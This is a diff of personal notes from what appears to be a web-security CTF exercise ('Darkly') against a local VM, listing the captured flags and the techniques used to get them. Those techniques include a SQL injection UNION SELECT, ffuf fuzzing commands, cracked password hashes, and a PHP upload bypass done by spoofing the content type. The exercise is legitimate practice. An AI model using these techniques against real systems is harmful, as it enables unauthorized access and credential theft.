@@ -1,6 +1,5 @@
 #+TITLE: Temp
-
-* Login page :
+*  Login page :
 
 Recover password - webmaster@borntosec.com
 ~flag - 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0~
@@ -39,77 +38,35 @@ ffuf -w payload.txt:FUZZ -u "http://192.168.56.103/?page=member&id=FUZZ&Submit=S
 echo 'fortytwo' | sha2
 ~flag - 3b4e8a30ecbfde518f50f2bda1912b40338ecd71821faeb1e9cdf44cefff95f5~
 
-* GSource page :
+* Source page :
 ?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c
 
 * Login :
+5 UNION SELECT username,password FROM Member_Brute_Force.db_default
 admin - shadow
 ~flag - b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2~
 
 * Fuzzing :
-
+ffuf -w common.txt:FUZZ -u http://192.168.56.105:80/FUZZ -fs 6892
 url/whatever - htpasswd http://192.168.56.102/whatever/htpasswdd
 root:8621ffdbc5698829397d97767ac13db3 - dragon
 go to url/admin
 ~flag - d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff~
+
+url/robots.txt
+url/.hidden
 
 * Member survey :
 
 modifier les parametres post dans le browser en mettant 42
 ~flag - 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa~
 
+* Feedback :
+~flag - 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e~
 
-
-Database: Member_Brute_Force
-Table: db_default
-[2 entries]
-+----+-------------------------------------------+----------+
-| id | password                                  | username |
-+----+-------------------------------------------+----------+
-| 1  | 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow) | root     |
-| 2  | 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow) | admin    |
-+----+-------------------------------------------+----------+
-
-Database: Member_Sql_Injection
-Table: users
-[4 entries]
-+---------+-----------+--------+-----------+-----------+----------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------+
-| user_id | town      | planet | country   | last_name | first_name     | Commentaire                                                                                                                                                          | countersign                                    |
-+---------+-----------+--------+-----------+-----------+----------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------+
-| 1       | Honolulu  | EARTH  | America   | Obama     | Barack Hussein | Amerca !                                                                                                                                                             | 2b3366bcfd44f540e630d4dc2b9b06d9               |
-| 2       | Berlin    | Earth  | Allemagne | Hitler    | Adolf          | Ich spreche kein Deutsch.                                                                                                                                            | 60e9032c586fb422e2c16dee6286cf10 (oktoberfest) |
-| 3       | Moscou    | Earth  | Russia    | Staline   | Joseph         | \\0418\\043E\\0441\\0438\\0444 \\0412\\0438\\0441\\0441\\0430\\0440\\0438\\043E\\043D\\043E\\0432\\0438\\0447 \\0414\\0436\\0443\\0433\\0430\\0448\\0432\\0438\\043B | e083b24a01c483437bcf4a9eea7c1b4d               |
-| 5       | 42        | 42     | 42        | GetThe    | Flag           | Decrypt this password -> then lower all the char. Sh256 on it and it's good !                                                                                        | 5ff9d0165b4f92b14994e5c685cdce28               |
-+---------+-----------+--------+-----------+-----------+----------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------+
-
-
-Database: Member_images
-Table: list_images
-[6 entries]
-+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
-| id | url                              | title     | comment                                                                                                               |
-+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
-| 1  | https://www.nsa.org/img.jpg      | Nsa       | An image about the NSA !                                                                                              |
-| 2  | https://www.42.fr/42.png         | 42 !      | There is a number..                                                                                                   |
-| 3  | https://www.google.fr/google.png | Google    | Google it !                                                                                                           |
-| 4  | https://www.obama.org/obama.jpg  | Obama     | Yes we can !                                                                                                          |
-| 5  | borntosec.ddns.net/images.png    | Hack me ? | If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 |
-| 6  | https://www.h4x0r3.0rg/tr0ll.png | tr00l     | Because why not ?                                                                                                     |
-+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
-
-
-Database: Member_survey
-Table: vote_dbs
-[4 columns]
-+---------+--------------+
-| Column  | Type         |
-+---------+--------------+
-| id_vote | int(11)      |
-| nb_vote | int(11)      |
-| subject | varchar(255) |
-| vote    | float        |
-+---------+--------------+
-
+* Upload image :
+Upload un fichier .php, remplacer le content type de la requete par image/jpeg
+~flag - 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8~
 
 λ ~/gitlab/darkly/ main* ffuf -w ~/tmp/directory-list-2.3-medium.txt -u 'http://192.168.56.102/FUZZ'
 
